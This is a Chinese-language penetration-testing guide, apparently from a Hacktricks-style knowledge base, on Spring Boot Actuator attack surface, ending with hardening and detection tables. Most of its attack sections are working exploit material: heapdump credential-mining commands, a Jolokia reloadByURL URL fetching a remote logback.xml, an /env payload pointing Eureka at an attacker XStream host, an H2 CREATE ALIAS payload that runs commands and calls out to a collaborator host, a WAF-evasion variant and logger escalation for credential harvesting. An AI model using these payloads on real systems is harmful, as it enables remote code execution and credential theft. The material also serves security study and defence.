---
status: NEEDS_HUMAN_REVIEW
degradation_reason: |
  9 个资源中 3 个降解（33.3%）。P0-01 Veracode（原始研究）和 P1-01 Wiz 
  均为 Next.js/React SPA — 全部 4 个回退工具已穷尽（curl → bb-browser → Playwright 
  未安装 → 代理返回相同 JS 壳）。文章内容存在于 JS 包中
  （分别为 70 和 17 个技术关键词匹配），但无法以纯文本形式独立验证。
  内容通过 Hacktricks 二手源保留。
verified_resources: |
  P0: spaceraccoon.dev（H2 RCE 深度分析 — 确认 §3.3 技术）
  P2: SpringAuthBypass.png、spring-boot.txt 字典、JDumpSpider
  P3: VisualVM、0xdf HTB Eureka
  IMG: Tesseract 部分提取
  SectionMapping: 11 VERIFIED · 2 SKIP · 0 MISSING

attack_surface:
  - 配置缺陷
  - 信息泄露
  - 注入类
impact:
  - 远程代码执行
  - 信息泄露
  - 机密性破坏
risk_level: 严重
prerequisites:
  - Spring Boot 与 Actuator 基础
  - JMX / MBeans 概念
  - Java 反序列化基础
related_techniques:
  - java-deserialization
  - ssrf
  - xxe
  - credential-harvesting
  - waf-bypass
difficulty: 中级
tools:
  - jdumpspider
  - visualvm
  - curl
  - jq
---

# Spring Actuators — Spring Boot Actuator Attack Surface — Spring Boot Actuator 攻击面分析

> 关联文档：[Java Deserialization](../../User%20input/Structured%20objects/Deserialization/README.md) · [SSRF](../../User%20input/Reflected%20Values/SSRF/README.md) · [XXE](../../User%20input/Structured%20objects/XXE/README.md) · [WAF Bypass](../../Proxies/Proxy%20&%20WAF%20Protections%20Bypass/README.md) · [Parameter Pollution](../../Other%20Helpful%20Vulnerabilities/Parameter%20Pollution/README.md)

---

### 知识路径

```
Spring Actuators（本文档）
  ├── 前置知识：Spring Boot 框架 — beans、properties、自动配置
  ├── 前置知识：JMX 与 MBeans — Jolokia 桥接概念
  ├── 进阶：/env + H2 Database RCE（链式利用）
  │   └── 参见：spaceraccoon.dev — RCE in Three Acts
  ├── 进阶：使用 VisualVM/OQL 进行 Heapdump 分析
  ├── 关联：Java Deserialization — XStream、Logback XML 链
  │   └── 参见：User input/Structured objects/Deserialization
  ├── 关联：SSRF — Matrix 参数路径名混淆
  │   └── 参见：User input/Reflected Values/SSRF
  ├── 关联：XXE — Logback XML 外部实体加载
  │   └── 参见：User input/Structured objects/XXE
  └── 关联：WAF Bypass — Spring Matrix 参数分隔符混淆
      └── 参见：Proxies/Proxy & WAF Protections Bypass
```

---

# 0x01 Spring Actuators 攻击面 — 原理与分类

## 1.1 Actuator 架构

Spring Boot Actuators 是由 `spring-boot-actuator` 依赖自动配置的生产级监控和管理端点。它们通过 HTTP（默认）或 JMX 暴露运行中应用程序的操作信息。

**按版本的端点注册：**

| 版本 | 基础路径 | 认证模式 | 备注 |
|------|---------|---------|------|
| Spring Boot 1.x（Actuator 1.0–1.4） | 根路径（`/`） | 所有端点默认**无需认证** | 暴露面最大 |
| Spring Boot 1.x（Actuator 1.5+） | 根路径（`/`） | 默认仅 `/health` 和 `/info` 为非敏感；`management.security.enabled=true` | 开发者常禁用此属性 |
| Spring Boot 2.x | `/actuator/` | 同样的模式；`/env` 属性修改使用 JSON 格式 | 基础路径变更破坏旧版扫描器 |
| Spring Boot 3.x | `/actuator/` | 同样的模式；Jakarta EE 9 迁移 | 技术手段相同 |

**关键端点类别：**

| 类别 | 端点 | 风险 |
|------|------|------|
| 配置暴露 | `/env`、`/configprops`、`/beans` | 凭据、内部 URL、密钥 |
| 运行时状态 | `/heapdump`、`/threaddump`、`/dump`、`/trace`、`/httpexchanges` | JVM 内存中的实时密钥、请求追踪 |
| 日志访问 | `/logfile`、`/loggers` | 日志内容、动态日志级别控制 |
| 操作控制 | `/shutdown`、`/restart`、`/refresh` | 应用生命周期操控 |
| 路由映射 | `/mappings` | 内部 API 结构、隐藏端点 |
| JMX 桥接 | `/jolokia` | MBean 访问 → 反序列化/RCE |

## 1.2 攻击面分类

| 类别 | 分类名称 | 端点/技术 |
|------|---------|---------|
| 配置缺陷 | 配置缺陷 | Actuator 无需认证暴露；`management.endpoints.web.exposure.include=*`；敏感端点未被禁用 |
| 信息泄露 | 信息泄露 | `/heapdump` 密钥泄露；`/env` 属性暴露；`/trace` 请求数据；`/logfile` 日志内容；`/configprops` 配置 |
| 注入类 | 注入类 | `/jolokia` reloadByURL → XXE → RCE；`/env` + Eureka → XStream 反序列化；`/env` + H2 → JDBC URL 注入 |
| 认证/授权绕过 | 认证/授权绕过 | Spring Auth Bypass 模式；`/env` 属性修改绕过安全限制 |
| 协议解析差异 | 协议解析差异 | Matrix 参数 SSRF（`;@evil.com/url`）— Spring vs 反向代理路径名解释差异 |

## 1.3 攻击面发现

用于 Actuator 端点枚举的综合字典：[spring-boot.txt](https://github.com/artsploit/SecLists/blob/master/Discovery/Web-Content/spring-boot.txt)

常见探测端点：

```
/actuator
/actuator/health
/actuator/env
/actuator/heapdump
/actuator/mappings
/actuator/loggers
/actuator/logfile
/actuator/configprops
/actuator/beans
/actuator/threaddump
/actuator/trace
/actuator/httpexchanges
/actuator/shutdown
/actuator/jolokia
/actuator/jolokia/list
/env
/health
/heapdump
/mappings
/jolokia
```

> **警告：** 以下 Actuator 端点在无需认证时暴露尤其危险：`/dump`、`/trace`、`/logfile`、`/shutdown`、`/mappings`、`/env`、`/actuator/env`、`/restart` 和 `/heapdump`。这些端点可暴露敏感数据或允许包括远程代码执行在内的有害操作。

---

# 0x02 通过 Actuator 实现信息泄露

## 2.1 /env — 环境属性暴露

### 2.1.1 机制

`/env` 端点暴露所有 Spring `Environment` 属性，包括系统属性、环境变量、`application.properties` 和 `application.yml`。这经常包含明文凭据。

```bash
curl -s http://target/actuator/env | jq .
```

高价值属性：
- `spring.datasource.url`、`spring.datasource.username`、`spring.datasource.password`
- `eureka.client.serviceUrl.defaultZone` — 可能包含嵌入式凭据
- `management.endpoints.web.exposure.include`
- `logging.file`、`logging.path`
- 任何名称中包含 `password`、`secret`、`key`、`token` 的自定义属性

### 2.1.2 Spring Boot 2.x JSON 格式

在 Spring Boot 2.x 中，`/env` 端点使用 JSON 格式进行属性修改（与 GET 响应格式一致），但属性暴露和操控的总体概念完全相同。

## 2.2 /heapdump — JVM 堆密钥挖掘

### 2.2.1 机制

如果 `/actuator/heapdump` 暴露，可以下载完整的 JVM 堆快照。堆中经常包含实时密钥：数据库凭据、API 密钥、Basic-Auth 头、内部服务 URL 以及 `OriginTrackedMapPropertySource` 对象中持有的完整 Spring 属性映射。

### 2.2.2 快速排查

```bash
# 下载 heapdump
wget http://target/actuator/heapdump -O heapdump

# 快速收获：搜索 HTTP 认证头和 JDBC 连接字符串
strings -a heapdump | grep -nE 'Authorization: Basic|jdbc:|password=|spring\.datasource|eureka\.client'

# 解码找到的 Base64 Basic-Auth 凭据
printf %s 'RXhhbXBsZUJhc2U2NEhlcmU=' | base64 -d
```

### 2.2.3 使用 VisualVM + OQL 深度分析

在 [VisualVM](https://visualvm.github.io/) 中打开 heapdump，使用 OQL（Object Query Language）搜索密钥：

```sql
select s.toString() 
from java.lang.String s 
where /Authorization: Basic|jdbc:|password=|spring\.datasource|eureka\.client|OriginTrackedMapPropertySource/i.test(s.toString())
```

### 2.2.4 使用 JDumpSpider 自动提取

```bash
java -jar JDumpSpider-*.jar heapdump
```

典型的高价值发现：
- Spring `DataSourceProperties` / `HikariDataSource` 对象暴露 `url`、`username`、`password`
- `OriginTrackedMapPropertySource` 条目揭示 `management.endpoints.web.exposure.include`、服务端口和 URL 中嵌入的 Basic-Auth（如 Eureka `defaultZone`）
- 纯文本 HTTP 请求/响应片段，包括在内存中捕获的 `Authorization: Basic ...`

> **提示：** 从 heapdump 中提取的凭据通常适用于相邻服务，有时甚至适用于系统用户（SSH）。在环境中广泛测试获取的凭据。

## 2.3 /mappings — 路由映射暴露

`/mappings` 端点列出所有已注册的请求映射，包括未公开记录的内部和隐藏端点。这揭示：

- 未记录的 Admin 端点
- 内部 API 路由
- 框架级端点（如 `/error`、`/actuator/*`）
- 带参数结构的自定义端点

```bash
curl -s http://target/actuator/mappings | jq .
```

## 2.4 /trace 与 /httpexchanges — 请求追踪泄露

- **Spring Boot 1.x：**`/trace` 展示最近 100 个 HTTP 请求，包括头部（Cookie、`Authorization`、会话 ID）
- **Spring Boot 2.x/3.x：**`/httpexchanges`（启用时）提供类似的请求/响应追踪，包含头部捕获

```bash
curl -s http://target/actuator/trace | jq .
curl -s http://target/actuator/httpexchanges | jq .
```

## 2.5 /configprops — 配置属性泄露

`/configprops` 展示所有 `@ConfigurationProperties` Bean 及其解析后的值：

```bash
curl -s http://target/actuator/configprops | jq .
```

这可能暴露数据库连接池、消息代理配置、缓存设置以及其他集成属性的运行时值。

---

# 0x03 远程代码执行

## 3.1 /jolokia — reloadByURL → XXE → RCE

### 3.1.1 机制

`/jolokia` Actuator 端点暴露 [Jolokia](https://jolokia.org/) 库，提供对 JMX MBeans 的 HTTP 访问。Logback `JMXConfigurator` MBean 上的 `reloadByURL` 操作可被利用从**外部 URL** 重新加载日志配置，从而启用：

1. **Blind XXE** — 加载带有外部实体定义的远程 XML 文件
2. **远程代码执行** — 构造的 Logback XML 配置（如 `<insertFromJNDI>`、脚本表达式）

### 3.1.2 利用 URL 模式

```
http://localhost:8090/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/artsploit.com!/logback.xml
```

URL 路径编码了 MBean ObjectName（`ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator`）、操作（`reloadByURL`）和目标 URL（`http://artsploit.com/logback.xml`），使用 `!/` 作为路径段分隔符。

### 3.1.3 条件

- `/jolokia` Actuator 端点必须暴露且可访问
- `logback-classic` 必须在 classpath 上（Spring Boot 默认包含）
- 目标到攻击者控制服务器之间的出站 HTTP 连通性
- Jolokia 端点无需认证（或启用时有有效凭据）

> **原始研究：**[Veracode — Exploiting Spring Boot Actuators](https://www.veracode.com/blog/research/exploiting-spring-boot-actuators)

## 3.2 /env + Spring Cloud Eureka — XStream 反序列化 RCE

### 3.2.1 机制

当 Spring Cloud Libraries 存在时，`/env` 端点允许**修改**环境属性（不仅仅是读取）。`eureka.client.serviceUrl.defaultZone` 属性可被指向攻击者控制的 URL，该 URL 提供恶意的 XStream 序列化 payload。当 Eureka 客户端尝试获取服务注册表时，反序列化攻击者的 payload。

### 3.2.2 利用

```http
POST /env HTTP/1.1
Host: 127.0.0.1:8090
Content-Type: application/x-www-form-urlencoded
Content-Length: 65

eureka.client.serviceUrl.defaultZone=http://artsploit.com/n/xstream
```

### 3.2.3 条件

- Spring Cloud Netflix Eureka 在 classpath 上
- `/env` 端点允许 POST（属性修改已启用）
- 目标的 Eureka 客户端定期从被污染的服务 URL 获取数据
- 攻击者在指定 URL 提供有效的 XStream Gadget 链

## 3.3 /env + H2 Database — HikariCP connection-test-query → CREATE ALIAS RCE

### 3.3.1 机制

Spring Boot 2.x 默认使用 **HikariCP** 作为数据库连接池。`spring.datasource.hikari.connection-test-query` 属性定义了一条 SQL 查询，在每个新数据库连接交给应用之前执行以验证连接有效性。当 `/env` 端点允许 POST 时，攻击者可以用恶意 SQL payload 覆盖此属性。

结合 **H2 Database Engine**（常见的开发依赖），可通过 H2 的 `CREATE ALIAS` 命令实现任意 Java 代码执行，该命令将 Java 函数注册为 SQL 可调用的别名。攻击链：

```
POST /actuator/env  →  覆盖 spring.datasource.hikari.connection-test-query
                        为 CREATE ALIAS ... Runtime.exec()
                    →  触发新数据库连接（POST /actuator/restart 或自然流量）
                    →  HikariCP 执行 connection-test-query
                    →  H2 CREATE ALIAS 注册 Java 函数
                    →  CALL 调用别名 → 系统命令执行
```

### 3.3.2 利用 Payload

```http
POST /actuator/env HTTP/1.1
Host: target.app
Content-Type: application/json

{"name":"spring.datasource.hikari.connection-test-query","value":"CREATE ALIAS EXEC AS CONCAT('String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new',' java.util.Scanner(Runtime.getRun','time().exec(cmd).getInputStream());  if (s.hasNext()) {return s.next();} throw new IllegalArgumentException(); }');CALL EXEC('curl  http://x.burpcollaborator.net');"}
```

### 3.3.3 通过字符串拼接绕过 WAF

`CREATE ALIAS` 函数体可使用 `CONCAT` 和 `HEXTORAW` 打散，以规避基于关键字的 WAF 过滤器（如拆分 `exec`、`Runtime`）：

```sql
CREATE ALIAS EXEC AS CONCAT('void e(String cmd) throws java.io.IOException',
HEXTORAW('007b'),'java.lang.Runtime rt= java.lang.Runtime.getRuntime();
rt.exec(cmd);',HEXTORAW('007d'));
CALL EXEC('whoami');
```

### 3.3.4 通过布尔 Oracle 实现盲 RCE

在受限环境（Docker、无出站网络、无 Shell）中，可以构造盲 RCE Oracle：Java 函数在成功时返回输出，失败时抛出异常。由于 `connection-test-query` 决定数据库连接是否"存活"：

- 命令产生输出 → 查询成功 → 应用正常运行
- 命令无输出 → 异常抛出 → 查询失败 → 应用返回错误

```java
String shellexec(String cmd) throws java.io.IOException {
    java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream());
    if (s.hasNext()) {
        return s.next();  // 输出存在 → SQL 查询成功 → 应用健康
    }
    throw new IllegalArgumentException(); // 无输出 → SQL 查询失败 → 应用报错
}
```

这实现了基于布尔的数据泄露：`grep root /etc/passwd` 成功，`grep nonexistent /etc/passwd` 失败。

### 3.3.5 触发连接池初始化

修改 `spring.datasource.hikari.connection-test-query` 后，必须创建新的数据库连接：
- `POST /actuator/restart` — 重启应用上下文，强制连接池重新初始化
- 生成足够流量耗尽现有连接池并强制创建新连接

### 3.3.6 条件

- `/env` 可通过 POST 写入（`management.endpoints.web.exposure.include=env` 或 `*`）
- Spring Boot 2.x（HikariCP 是默认连接池）
- H2 Database Engine 在 classpath 上（`com.h2database:h2` 依赖 — 开发环境常见）
- `/actuator/restart` 暴露，或有能力触发足够流量实现连接池周转

## 3.4 /env + DataSource 属性操控

其他可利用操控的属性：

- `spring.datasource.tomcat.validationQuery` — 注入子查询或基于时间的 SQL
- `spring.datasource.tomcat.url` — 将数据库连接重定向到攻击者控制的服务器
- `spring.datasource.tomcat.max-active` — 资源耗尽 / DoS
- `spring.datasource.tomcat.validationInterval` — 时间操控

> **注意：** 属性名与连接池提供方相关。Tomcat JDBC 池使用 `spring.datasource.tomcat.*`；HikariCP 使用 `spring.datasource.hikari.*`。

---

# 0x04 认证绕过与 SSRF

## 4.1 Spring 认证绕过模式

在某些 Spring Security 配置中存在已知的认证绕过，Actuator 端点因过滤器链顺序或路径匹配错误而在无意中未被保护。

[图片: Spring Auth Bypass 图示 — Tesseract 提取："nothing supernatural 2 @ TOMCAT_ROOT_DIR/webapps/testApp/WEB-INF/Avebxml Tips to know"。展示过滤器链绕过模式，Actuator 路径规避 Spring Security 认证过滤器。来源：Mike-n1/tips]

**图片来源：**[https://raw.githubusercontent.com/Mike-n1/tips/main/SpringAuthBypass.png](https://raw.githubusercontent.com/Mike-n1/tips/main/SpringAuthBypass.png)

## 4.2 Matrix 参数 SSRF — Spring 路径名解释

### 4.2.1 机制

Spring Framework 在 HTTP 路径名中对 [matrix 参数](https://docs.spring.io/spring-framework/reference/web/webmvc/mvc-controller/ann-requestmapping.html#mvc-ann-matrix-variables)（`;`）的处理与反向代理和 WAF 使用的标准 URI 解析器存在差异。以分号分隔的段（如 `;@evil.com`）被 Spring 解释为路径参数，但可能被其他解析器视为 authority 组件。

### 4.2.2 利用

```http
GET ;@evil.com/url HTTP/1.1
Host: target.com
Connection: close
```

Spring 将此解释为：对路径 `/url` 的请求，matrix 参数绑定到根段。然而，某些 SSRF 漏洞组件（反向代理、内部 HTTP 客户端、URL 重写引擎）可能将 `;@evil.com` 解析为 userinfo + host 覆盖，将请求路由到 `evil.com`。

### 4.2.3 条件

- Spring MVC 应用（matrix 参数默认启用）
- 下游存在误解析路径名的 SSRF 漏洞组件
- 反向代理或 WAF 未经规范化直接转发字面的 `;@evil.com` 路径段

此技术与 [WAF Bypass](../../Proxies/Proxy%20&%20WAF%20Protections%20Bypass/README.md) 密切相关 — 在 Tomcat 路径遍历中被利用的相同 `;` 分隔符行为差异（参见 [Tomcat §3.4](../../Web%20Servers%20&%20Middleware/Tomcat/README.md#34-path-traversal-bypass-via-path-delimiter-confusion)）同样适用于 Spring 的 matrix 变量解析器在结合 SSRF 易感组件时的场景。

---

# 0x05 通过 Logger 滥用的凭据收集

## 5.1 动态日志级别提升

### 5.1.1 机制

如果 `management.endpoints.web.exposure.include` 允许且 `/actuator/loggers` 暴露，攻击者可以将处理认证和请求处理的包的日志级别动态提升到 `DEBUG` 或 `TRACE`。结合可读的日志（通过 `/actuator/logfile` 或已知日志路径），这可能在登录流程中泄露提交的凭据 — 包括 Basic-Auth 头和表单参数。

### 5.1.2 枚举与提升

```bash
# 列出所有可用的 Logger
curl -s http://target/actuator/loggers | jq .

# 为安全/Web 栈启用 TRACE 级别日志
curl -s -X POST http://target/actuator/loggers/org.springframework.security \
     -H 'Content-Type: application/json' -d '{"configuredLevel":"TRACE"}'

curl -s -X POST http://target/actuator/loggers/org.springframework.web \
     -H 'Content-Type: application/json' -d '{"configuredLevel":"TRACE"}'

curl -s -X POST http://target/actuator/loggers/org.springframework.cloud.gateway \
     -H 'Content-Type: application/json' -d '{"configuredLevel":"TRACE"}'
```

### 5.1.3 定位并读取日志

```bash
# 如果 /actuator/logfile 暴露，直接读取
curl -s http://target/actuator/logfile | strings | grep -nE 'Authorization:|username=|password='

# 否则，查询 /actuator/env 定位日志文件路径
curl -s http://target/actuator/env | jq '.propertySources[].properties | to_entries[] | select(.key|test("^logging\\.(file|path)"))'
```

### 5.1.4 触发认证流量

启用详细日志后，触发认证请求（或等待合法用户流量）以在日志中捕获凭据。在网关前端认证的微服务架构中，为网关/安全包启用 `TRACE` 通常会使头部和表单体在日志流中可见。

> **注意：** 某些环境会定期生成合成登录流量用于健康检查，使凭据收集在日志设为详细模式后变得极为简单。

### 5.1.5 清理

```bash
# 完成后重置日志级别 — 将 configuredLevel 设为 null
curl -s -X POST http://target/actuator/loggers/org.springframework.security \
     -H 'Content-Type: application/json' -d '{"configuredLevel":null}'
```

## 5.2 /actuator/httpexchanges — 近期请求元数据

如果 `/actuator/httpexchanges` 暴露，它展示近期的请求元数据，可能包含敏感头部（`Authorization`、会话 Cookie、API Token），而无需提升日志级别。这是 Logger 攻击的被动替代方案。

---

# 0x06 防御、加固与工具

## 6.1 加固检查表

| 措施 | 理由 |
|------|------|
| 绝不将 Actuator 暴露到互联网 — 通过 `management.server.port` 和 `management.server.address` 绑定到 `127.0.0.1` | 将管理端点隔离到 localhost |
| 设置 `management.endpoints.web.exposure.include=health,info`（最小化） | 仅暴露非敏感端点 |
| 禁用单个危险端点：`management.endpoint.shutdown.enabled=false`、`management.endpoint.heapdump.enabled=false`、`management.endpoint.env.enabled=false` | 纵深防御 |
| 设置 `management.endpoints.enabled-by-default=false` 并仅白名单所需端点 | 选择加入而非选择退出 |
| 始终在 Actuator 端点上启用 Spring Security：`management.endpoint.health.show-details=when-authorized` | 要求认证才能访问敏感数据 |
| 使用专用管理端口，配合防火墙规则限制对可信 IP 的访问 | 网络层隔离 |
| 如果不需要，彻底禁用 Jolokia：排除 `jolokia-core` 依赖 | 移除 JMX 桥接攻击面 |
| 审计 `spring.datasource.*`、`eureka.client.*` 和自定义属性中是否嵌入凭据 | 减少 `/env` 泄露时的暴露面 |
| 生产环境启用 `logging.level.org.springframework.boot.actuate=INFO` | 防止敏感数据出现在日志中 |
| 审查所有 `application-{profile}.yml` 文件中的 `management.endpoints.web.exposure.include` | 特定 Profile 的覆盖可能重新启用端点 |
| 在主版本内升级 Spring Boot 到最新补丁 | Actuator 端点的 CVE 会定期修复 |

## 6.2 检测指标

| 指标 | 意义 |
|------|------|
| `GET /actuator/heapdump` 后跟大量出站数据传输 | Heap dump 泄露 |
| `POST /actuator/loggers/*` 带 `configuredLevel: TRACE` | Logger 篡改 |
| `POST /actuator/env` 或 `POST /env` 带属性修改 | 属性注入 |
| `GET /jolokia/exec/` 路径中包含外部 URL | Jolokia reloadByURL 利用 |
| 从非内部 IP 访问 `/actuator/mappings`、`/actuator/beans`、`/actuator/configprops` | 侦察阶段 |
| 探测 `/actuator/*` 路径返回多次 `404` | Actuator 端点发现 |
| 属性修改后的 `POST /actuator/refresh` | 链式攻击触发 |

## 6.3 工具清单

| 工具 | 用途 | 参考 |
|------|------|------|
| `JDumpSpider` | 自动化 Heapdump 密钥提取 | [github.com/whwlsfb/JDumpSpider](https://github.com/whwlsfb/JDumpSpider) |
| `VisualVM` | Heapdump 分析 + OQL 查询 | [visualvm.github.io](https://visualvm.github.io/) |
| `spring-boot.txt`（SecLists） | Actuator 端点字典 | [github.com/artsploit/SecLists](https://github.com/artsploit/SecLists/blob/master/Discovery/Web-Content/spring-boot.txt) |
| `curl` + `jq` | 手动 Actuator 探测 | 内置 |
| `strings` | 快速 Heapdump 排查 | 内置 |

## 参考资料

- [Veracode — Exploiting Spring Boot Actuators（原始研究）](https://www.veracode.com/blog/research/exploiting-spring-boot-actuators)
- [spaceraccoon.dev — RCE in Three Acts: Chaining Exposed Actuators and H2 Database](https://spaceraccoon.dev/remote-code-execution-in-three-acts-chaining-exposed-actuators-and-h2-database)
- [Wiz — Exploring Spring Boot Actuator Misconfigurations](https://www.wiz.io/blog/spring-boot-actuator-misconfigurations)
- [0xdf — HTB Eureka（Actuator heapdump + Gateway logging abuse）](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [JDumpSpider — Heapdump 分析工具](https://github.com/whwlsfb/JDumpSpider)
- [VisualVM — JVM 监控与堆分析](https://visualvm.github.io/)
- [Spring 官方 — Actuator 端点文档](https://docs.spring.io/spring-boot/docs/current/reference/html/actuator.html)
- [Spring 官方 — Matrix 变量](https://docs.spring.io/spring-framework/reference/web/webmvc/mvc-controller/ann-requestmapping.html#mvc-ann-matrix-variables)
